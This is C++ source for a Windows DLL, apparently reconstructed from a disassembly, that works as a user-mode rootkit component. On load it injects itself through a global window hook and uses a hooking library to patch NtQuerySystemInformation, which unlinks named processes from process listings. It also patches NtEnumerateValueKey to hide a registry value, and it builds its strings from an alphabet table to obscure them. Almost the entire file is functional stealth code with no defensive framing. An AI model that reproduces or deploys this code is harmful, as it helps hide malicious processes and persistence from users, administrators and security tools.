// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"
#include <winternl.h>
#include <stdio.h>
#include <Windows.h>


/*
ExistFile();
CopyFile();
*/


void __cdecl OutDbgStrWW(LPCWSTR szFmtStr, ...)
{
	WCHAR wszDebug[8064];
	va_list arg_list;
	va_start(arg_list, szFmtStr);
	_vsnwprintf_s(wszDebug, 8064, 8064, szFmtStr, arg_list);
	va_end(arg_list);
	OutputDebugStringW(wszDebug);
}

static ULONG g_dw1000BC50 = 0xFFFFFFFF;
static ULONG g_dw1000BC54 = 0xFFFFFFFF;
static wchar_t g_als[69] = {
	'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i',
	'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A',
	'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O',
	'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '=', '/', '%', '.', ':', '_', 0 };


typedef enum _KEY_VALUE_INFORMATION_CLASS
{ 
	KeyValueBasicInformation           = 0,
	KeyValueFullInformation,
	KeyValuePartialInformation,
	KeyValueFullInformationAlign64,
	KeyValuePartialInformationAlign64,
	MaxKeyValueInfoClass
} KEY_VALUE_INFORMATION_CLASS;


typedef NTSTATUS (__stdcall* pFnNtQuerySystemInfo)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS (__stdcall* pFnNtEnumerateValueKey)(
	IN HANDLE KeyHandle,
	IN ULONG Index,
	IN KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
	OUT PVOID KeyValueInformation,
	IN ULONG KeyValueInformationLength,
	OUT PULONG ResultLength
	);

HMODULE g_hMod = NULL;//1000C758
wchar_t g_wMBC[0x40] = {0, };//1000C760
wchar_t g_wserviceinstall[0x40] = {0, };//1000C7A0
wchar_t g_wwls[0x40] = {0, };//1000C7E0
wchar_t g_wready[0x40] = {0, };//1000C820
wchar_t g_wSysWOW_FullPath[0x40] = {0, };//1000C860
wchar_t g_wcmd[0x40] = {0, };//1000C8A0
wchar_t g_wmain[0x40] = {0, };//1000C8E0
wchar_t g_wconhost[0x40] = {0, };//1000C920
wchar_t g_java32[0x40] = {0, };//1000C960
wchar_t g_wlist[0x40] = {0, };//1000C9A0
wchar_t g_fellowing[0x40] = {0, };//1000C9E0
wchar_t g_ncptstat[0x40] = {0, };//1000CA20
wchar_t g_ncauxSec[0x20] = {0, };//1000CA60
HHOOK g_hhk = NULL;//1000CAA0
DWORD g_dwInitFlag = 0;//1000CAA4
HOOK_TRACE_INFO g_dw1000CAA8;
HOOK_TRACE_INFO g_dw1000CAAC;

pFnNtQuerySystemInfo g_NtQuerySystemInformation;
pFnNtEnumerateValueKey g_NtEnumerateValueKey;

void __declspec(dllexport) SetHook();
void G_InstallHook();
void G_UninstallAllHook();

int __stdcall NtQuerySystemInformation_HookProc(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
void Spy_NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);

DWORD __stdcall NtEnumerateValueKey_HookProc(HANDLE, ULONG, KEY_VALUE_INFORMATION_CLASS, PVOID, ULONG Length, PULONG);
int Spy_NtEnumerateValueKey(NTSTATUS arg_0, KEY_VALUE_INFORMATION_CLASS arg_4, PVOID dwArgESI);


BOOL APIENTRY DllMain( HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
	)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		g_hMod = hModule;
		G_InstallHook();
		break;
	case DLL_PROCESS_DETACH:
		G_UninstallAllHook();
		break;
	}
	return TRUE;
}


LRESULT __stdcall fn(int nCode, WPARAM wParam, LPARAM lParam)
{
	return CallNextHookEx(g_hhk, nCode, wParam, lParam);
}

void SetHook()
{
	g_hhk = SetWindowsHookExW(WH_CALLWNDPROC, (HOOKPROC)fn, g_hMod, 0);
}


void G_InstallHook()
{
	wchar_t var_20C[260];//WORD
	wchar_t LibFileName[260];
	wchar_t var_61C[260];//char var_61C[520];
	wchar_t Buffer[126];

	if(g_dwInitFlag == 0)
	{
		//  '0','1','2','3','4','5','6','7','8','9',
		//  'a','b','c','d','e','f','g','h','i','j',
		//  'k','l','m','n','o','p','q','r','s','t',
		//  'u','v','w','x','y','z','A','B','C','D',
		//  'E','F','G','H','I','J','K','L','M','N',
		//  'O', 'P','Q','R','S','T','U','V','W','X',
		//  'Y','Z','=','/','%','.',':','_', 0};

		wsprintfW(g_ncauxSec, L"%c%c%c%c%c",
			g_als[17], g_als[25], g_als[27], g_als[24], g_als[12]);//hproc

 		wsprintfW(g_ncptstat, L"%c%c%c%c%c%c",//NVDisp.exe 
 			g_als[49], g_als[57], g_als[39], g_als[18], 
 			g_als[28], g_als[25]);

		OutDbgStrWW(L"SLoader: ProcName:%s ----- ExeName:%s \n", g_ncauxSec, g_ncptstat);

		//MBC
		wsprintfW(g_wMBC, L"%c%c%c%c%c%c%c%c%c%c%c", 'p','i','c','a','d','e','s','k','t','o','p');//NLS
		
		memset(g_java32, 0, sizeof(g_java32));
		wsprintfW(g_java32, L"%c%c%c%c%c%c", g_als[19], g_als[10], g_als[31], g_als[10], g_als[3], g_als[2]);

#ifdef STORECODE
		GetWindowsDirectoryW(Buffer, 0xFC);
		wsprintfW(g_wSysWOW_FullPath, L"%s\\%s", Buffer, g_java32);
		OutDbgStrWW(L"SLoader: FullPath: [%s]\n", g_wSysWOW_FullPath);
		g_dwInitFlag = 1;
#endif // STORECODE
		GetWindowsDirectoryW(Buffer, 0xFC);
		wsprintfW(g_wSysWOW_FullPath, L"%s", Buffer);
		OutDbgStrWW(L"SLoader: FullPath: [%s]\n", g_wSysWOW_FullPath);
		g_dwInitFlag = 1;

		GetSystemDirectoryW(var_61C, 0x104);
		wsprintfW(LibFileName, L"%s\\ntdll.dll", var_61C);
		HMODULE hModule = LoadLibraryW(LibFileName);
		if(hModule)
		{
			g_NtQuerySystemInformation = (pFnNtQuerySystemInfo)GetProcAddress(hModule, "NtQuerySystemInformation");
			g_NtEnumerateValueKey = (pFnNtEnumerateValueKey)GetProcAddress(hModule, "NtEnumerateValueKey");
		}//loc_10001458
		if ( g_NtQuerySystemInformation && g_NtEnumerateValueKey )
		{
#ifdef OS_64
			wsprintfW(var_20C, L"%s\\System32\\%s64.dll", g_wSysWOW_FullPath, g_ncauxSec); //copy task to sys32 folder hproc64.dll
#else
			wsprintfW(var_20C, L"%s\\%s32.dll", g_wSysWOW_FullPath, g_ncauxSec);
#endif
			OutDbgStrWW(L"SLoader: HLoader: [%s]\n", var_20C);

			HMODULE hServiceMain = LoadLibraryW(var_20C);
			if ( hServiceMain )
			{
#ifdef OS_64
				MyLhInstallHook* pMyLhInstallHook = (MyLhInstallHook*)GetProcAddress(hServiceMain, "LhInstallHook");
				MyLhSetExclusiveACL* pMyLhSetExclusiveACL = (MyLhSetExclusiveACL*)GetProcAddress(hServiceMain, "LhSetExclusiveACL");
#else
				MyLhInstallHook* pMyLhInstallHook = (MyLhInstallHook*)GetProcAddress(hServiceMain, "_LhInstallHook@16");
				MyLhSetExclusiveACL* pMyLhSetExclusiveACL = (MyLhSetExclusiveACL*)GetProcAddress(hServiceMain, "_LhSetExclusiveACL@12");
#endif
				OutDbgStrWW(L"SLoader: _LhInstallHook@16: [%s]\n", var_20C);
				if (pMyLhInstallHook && pMyLhSetExclusiveACL)
				{
					pMyLhInstallHook(g_NtQuerySystemInformation, NtQuerySystemInformation_HookProc, 0, &g_dw1000CAA8);
					OutDbgStrWW(L"SLoader: NtQuerySystemInformation_HookProc: [%x]\n", g_dw1000CAA8);
					pMyLhSetExclusiveACL(&g_dw1000BC50, 1, &g_dw1000CAA8);

 					pMyLhInstallHook(g_NtEnumerateValueKey, NtEnumerateValueKey_HookProc, 0, &g_dw1000CAAC);
					OutDbgStrWW(L"SLoader: NtEnumerateValueKey_HookProc: [%x]\n", g_dw1000CAAC);
					pMyLhSetExclusiveACL(&g_dw1000BC54, 1, &g_dw1000CAAC);
				}
			}
		}//loc_100014FF
	}//loc_10001503
}

//10001520 1C
void G_UninstallAllHook()
{
	wchar_t var_20C[0x104];
	MyLhUninstallAllHooks* pMyLhUninstallAllHooks;

	wsprintfW(var_20C, L"%s\\%s.dll", g_wSysWOW_FullPath, g_ncauxSec);
	HMODULE hModule = LoadLibraryW(var_20C);
	
	if(hModule)
	{
#ifdef OS_64

		pMyLhUninstallAllHooks = (MyLhUninstallAllHooks*)GetProcAddress(hModule, "LhUninstallAllHooks");
#else
		pMyLhUninstallAllHooks = (MyLhUninstallAllHooks*)GetProcAddress(hModule, "_LhUninstallAllHooks@0");
#endif
		if(pMyLhUninstallAllHooks)
			pMyLhUninstallAllHooks();
	}//loc_10001571
}

//10001590 1C
int __stdcall NtQuerySystemInformation_HookProc(
	SYSTEM_INFORMATION_CLASS SystemInformationClass, 
	PVOID SystemInformation, 
	ULONG SystemInformationLength, 
	PULONG ReturnLength)
{
	NTSTATUS nEsi = g_NtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
	if( nEsi>= 0 )
	{
		Spy_NtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
	}//loc_100015C0
	return nEsi;
}

//100015D0 1C
DWORD __stdcall NtEnumerateValueKey_HookProc(HANDLE arg_0, ULONG arg_4, KEY_VALUE_INFORMATION_CLASS arg_8, OUT PVOID arg_C, ULONG arg_10, OUT PULONG arg_14)
{
	return Spy_NtEnumerateValueKey(g_NtEnumerateValueKey(arg_0, arg_4, arg_8, arg_C, arg_10, arg_14), arg_8, arg_C);
}

//typedef struct _SYSTEM_PROCESS_INFORMATION {   
//	ULONG                   NextEntryOffset; //NextEntryDelta
//	ULONG                   NumberOfThreads; 
//	LARGE_INTEGER           Reserved[3];   
//	LARGE_INTEGER           CreateTime;   //
//	LARGE_INTEGER           UserTime;     //UserMode (Ring 3) CPU time
//	LARGE_INTEGER           KernelTime;   //KernelMode(Ring 0) CPU time
//	UNICODE_STRING          ImageName;    //ProcessName
//	KPRIORITY               BasePriority; //Process Priority
//	HANDLE                  ProcessId;    //ULONG UniqueProcessId 
//	HANDLE                  InheritedFromProcessId; //
//	ULONG                   HandleCount; //
//	ULONG                   Reserved2[2];   
//	ULONG                   PrivatePageCount;   
//	VM_COUNTERS             VirtualMemoryCounters; //
//	IO_COUNTERS             IoCounters; //
//	SYSTEM_THREAD           Threads[0]; //
//} SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;   

//SystemInformationClass arg_0 arg_4 SYSTEM_PROCESS_INFORMATION
//10001610 1C dwArgECX SystemInformation Dll
typedef NTSTATUS(WINAPI *PNT_QUERY_SYSTEM_INFORMATION)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);
typedef struct __SYSTEM_PROCESS_INFORMATION {
	ULONG NextEntryOffset;
	ULONG NumberOfThreads;
	LARGE_INTEGER WorkingSetPrivateSize;
	ULONG HardFaultCount;
	ULONG NumberOfThreadsHighWatermark;
	ULONGLONG CycleTime;
	LARGE_INTEGER CreateTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER KernelTime;
	UNICODE_STRING ImageName;
	LONG BasePriority;
	PVOID UniqueProcessId;
	PVOID InheritedFromUniqueProcessId;
	ULONG HandleCount;
	ULONG SessionId;
	ULONG_PTR UniqueProcessKey;
	ULONG_PTR PeakVirtualSize;
	ULONG_PTR VirtualSize;
	ULONG PageFaultCount;
	ULONG_PTR PeakWorkingSetSize;
	ULONG_PTR WorkingSetSize;
	ULONG_PTR QuotaPeakPagedPoolUsage;
	ULONG_PTR QuotaPagedPoolUsage;
	ULONG_PTR QuotaPeakNonPagedPoolUsage;
	ULONG_PTR QuotaNonPagedPoolUsage;
	ULONG_PTR PagefileUsage;
	ULONG_PTR PeakPagefileUsage;
	ULONG_PTR PrivatePageCount;
	LARGE_INTEGER ReadOperationCount;
	LARGE_INTEGER WriteOperationCount;
	LARGE_INTEGER OtherOperationCount;
	LARGE_INTEGER ReadTransferCount;
	LARGE_INTEGER WriteTransferCount;
	LARGE_INTEGER OtherTransferCount;
} S_SYSTEM_PROCESS_INFORMATION, *P_SYSTEM_PROCESS_INFORMATION;

PNT_QUERY_SYSTEM_INFORMATION Original_NtQuerySystemInformation;
PNT_QUERY_SYSTEM_INFORMATION New_NtQuerySystemInformation;

void Spy_NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
{
	OutputDebugString(L"Spy_NtQuerySystemInformation");

#ifdef OS_64
	if (SystemProcessInformation == SystemInformationClass)
	{
		P_SYSTEM_PROCESS_INFORMATION prev = P_SYSTEM_PROCESS_INFORMATION(SystemInformation);
		P_SYSTEM_PROCESS_INFORMATION curr = P_SYSTEM_PROCESS_INFORMATION((PUCHAR)prev + prev->NextEntryOffset);

		while (prev->NextEntryOffset != NULL)
		{
			if (!lstrcmp(curr->ImageName.Buffer, L"BalaServiceTest.exe"))  /// hide main process
			{
				if (curr->NextEntryOffset == 0)
				{
					prev->NextEntryOffset = 0;		// if above process is at last
				}
				else
				{
					prev->NextEntryOffset += curr->NextEntryOffset;
				}
				curr = prev;
			}
 			if (!lstrcmp(curr->ImageName.Buffer, L"balaTestServiceFinal.exe")) //hide child proces 
 			{
 				if (curr->NextEntryOffset == 0)
 				{
 					prev->NextEntryOffset = 0;
 				}
 				else 
 				{
 					prev->NextEntryOffset += curr->NextEntryOffset;
 				}
 				curr = prev;
 			}
			prev = curr;
			curr = P_SYSTEM_PROCESS_INFORMATION((PUCHAR)curr + curr->NextEntryOffset);
		}
	}

	return;

#else
	wchar_t var_204[0x100];
	PSYSTEM_PROCESS_INFORMATION pCur, pPrev;
	pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;

	if (pCur && (SystemInformationClass == SystemProcessInformation))
	{
		while (pCur->NextEntryOffset)
		{//10001650
			pPrev = pCur;
			pCur = (PSYSTEM_PROCESS_INFORMATION)(((ULONG)pCur) + pCur->NextEntryOffset);

			memset(var_204, 0, 0x100);
			wcsncpy_s(var_204, (wchar_t*)pCur->Reserved2[1], (*(SHORT*)pCur->Reserved2) / 2);
			_wcslwr_s(var_204);
			if (wcsstr(var_204, g_ncptstat))
			{//100016C6
				if (pCur->NextEntryOffset == 0)
					pPrev->NextEntryOffset = 0;
				else
					pPrev->NextEntryOffset += pCur->NextEntryOffset;

				pCur = pPrev;
			}
		}
	}//loc_100016DE

#endif
}

typedef struct _KEY_VALUE_FULL_INFORMATION {
	ULONG TitleIndex;
	ULONG Type;
	ULONG DataOffset;
	ULONG DataLength;
	ULONG NameLength;
	WCHAR Name[1];
} KEY_VALUE_FULL_INFORMATION, *PKEY_VALUE_FULL_INFORMATION;

//10001700 1C
int Spy_NtEnumerateValueKey(NTSTATUS arg_0, KEY_VALUE_INFORMATION_CLASS arg_4, PVOID dwArgESI)
{
	wchar_t var_404[0x200] = {0,};
	ULONG dwEDI;
	NTSTATUS MyStatus = arg_0;

	KEY_VALUE_FULL_INFORMATION* pKeyFullINFO = (KEY_VALUE_FULL_INFORMATION*)dwArgESI;
	//dwArgESI = KEY_VALUE_FULL_INFORMATION
	if( (MyStatus >= 0) && (pKeyFullINFO != 0) ) //
	{
		if(arg_4 == KeyValueFullInformation) //KEY_VALUE_INFORMATION_CLASS.KeyValueFullInformation
		{
			dwEDI = pKeyFullINFO->NameLength; 
			if ( (dwEDI != 0) && (dwEDI > 2) && (dwEDI < 0x1FE) )
			{
				if(pKeyFullINFO->Name)
				{
					memset(var_404, 0, 0x400);
					wcsncpy_s(var_404, (wchar_t*)pKeyFullINFO->Name, dwEDI / 2);
					_wcsupr_s(var_404);
					if (wcsstr(var_404, g_wMBC) )
					{//loc_100017B6
						memset((void*)pKeyFullINFO->Name, 0, pKeyFullINFO->NameLength);
						pKeyFullINFO->NameLength = 0;
						MyStatus = (int)0x80000006;
					}
				}
			}
		}
	}
	return MyStatus;
}
